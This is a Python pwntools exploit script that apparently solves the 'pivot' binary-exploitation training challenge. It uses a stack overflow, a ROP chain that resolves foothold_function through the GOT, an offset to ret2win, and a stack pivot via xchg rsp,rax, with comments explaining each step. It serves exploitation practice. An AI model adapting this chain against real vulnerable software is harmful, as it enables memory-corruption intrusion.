from pwn import *

elf = context.binary = ELF("pivot")
p = process(elf.path)

# To automatically open GDB in separate terminal, uncomment the next 2 lines
# context.terminal = ('xfce4-terminal', '-e')
# gdb.attach(p)

# saving the stack pivot address given by the program in pivot_addr variable
p.recvuntil(': ')
pivot_addr = p.recvuntil('\n', drop=True)
print(pivot_addr)
pivot_addr = pivot_addr.split(b"x")[1].strip()
pivot_addr = int(pivot_addr, 16)
pivot_addr = p64(pivot_addr)
print(pivot_addr.hex())
p.recvuntil('> ')

# useful gadgets
POP_RAX_RET = 0x4009bb
XCHG_RSP_RAX_RET = 0x4009bd
ADD_RAX_RBP_RET = 0x4009c4
FOOTHOLD_FUNC_PLT = 0x400720     # PLT address of Foothold function
POP_RDI_RET = 0x400a33
PUTS_PLT = 0x4006e0		 # PLT address of puts@glibc
MOV_RAX_PTR_RAX_RET = 0x4009c0
FOOTHOLD_FUNC_GOT_PLT_ADDR = 0x601040      # GOT..PLT address of Foothold function
JMP_QWORDPTR_RAX = 0x400c23
POP_RBP_RET = 0x4007c8
JMP_RAX = 0x4007c1
PUTS_FUNC_GOT_PLT_ADDR = 0x60101f        # GOT..PLT address of puts function

# first payload that ends up at the pivot address given by the program
# Foothold function is called first so that its absolute address gets saved in its GOT..PLT entry (the address at which its code begins once libpivot.so library is lazy binded (linked) to the program)
# next, we pop Foothold function's GOT..PLT entry address into RAX
# then value at that entry address (this value is now absolute address at which Foothold function's code is after libpivot.so is imported) is moved into RAX. Therefore, RAX now contains absolute address of Foothold, which is a value at the GOT..PLT entry address which was in RAX until MOV_RAX_PTR_RAX_RET was executed
# next 0x117 is popped into RBP because Foothold function and ret2win (function we want to call) are 117 bytes away from each other in libpivot.so
# we add 0x117 to absolute address of Foothold function, which is in RAX, and get an absolute address of ret2win now placed in RAX
# finally we jump to address in RAX and ret2win is executed, throwing us the flag

payload_1 = p64(FOOTHOLD_FUNC_PLT)
payload_1 += p64(POP_RAX_RET)
payload_1 += p64(FOOTHOLD_FUNC_GOT_PLT_ADDR)
payload_1 += p64(MOV_RAX_PTR_RAX_RET)
payload_1 += p64(POP_RBP_RET)
payload_1 += p64(0x117)
payload_1 += p64(ADD_RAX_RBP_RET)
# payload_1 += p64(JMP_QWORDPTR_RAX)
payload_1 += p64(JMP_RAX)

# payload_1 += p64(POP_RDI_RET)
# payload_1 += p64(FOOTHOLD_FUNC_GOT_PLT_ADDR)
# payload_1 += p64(PUTS_FUNC_GOT_PLT_ADDR)
# payload_1 += p64(PUTS_PLT)
# payload_1 += p64(POP_RDI_RET)
# payload_1 += p64(0x400ac8)
# payload_1 += p64(PUTS)

# payload_1 = p64(FUNC)
p.sendline(payload_1)
# pause()

# second prompt for user input, here we send the junk 40 bytes to smash the stack and we send it gadgets that put pivot address into RAX, then exchange RAX with RSP, putting that address into RSP and effectively redirecting (pivoting) the stack to the address given by the program. The payload we sent in the first prompt (payload_1) is already at that location of the pivoted stack
p.recvuntil('> ')

payload_2 = b'A' * 40
payload_2 += p64(POP_RAX_RET)
payload_2 += pivot_addr
payload_2 += p64(XCHG_RSP_RAX_RET)

p.sendline(payload_2)
# pause()
p.interactive() 
